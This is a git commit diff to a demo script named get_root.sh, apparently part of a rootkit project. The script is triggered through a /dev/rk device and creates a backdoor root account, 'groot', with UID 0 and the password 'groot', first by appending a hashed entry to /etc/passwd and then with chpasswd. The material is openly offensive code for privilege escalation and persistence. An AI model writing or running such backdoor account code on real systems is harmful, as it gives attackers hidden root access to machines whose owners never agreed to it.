4b3805eff3436ac94a7cad17bc94e644625dc988
Tommy <43862943+tommyp6@users.noreply.github.com>
2021-05-25 18:20:44 +0200

    Add changes to README + demo script.

--- demos/get_root.sh
+++ demos/get_root.sh
@@ -2,8 +2,5 @@
 # Copy this script to /dev/shm/rk.sh and run `echo password run > /dev/rk`
 # Script to get to root using the /dev/shm/rk.sh script.
 
-# generate password with: openssl passwd -1 -salt groot groot
-password="$1$groot$lM0MiPVydk.DfCCIAwtck1"
-echo "groot:$password:0:0:groot:/root:/bin/bash" >> /etc/passwd
-
-# Now you can login as root with groot:groot
+echo "groot:x:0:0::/root:/bin/bash" >> /etc/passwd
+echo "groot:groot" | chpasswd
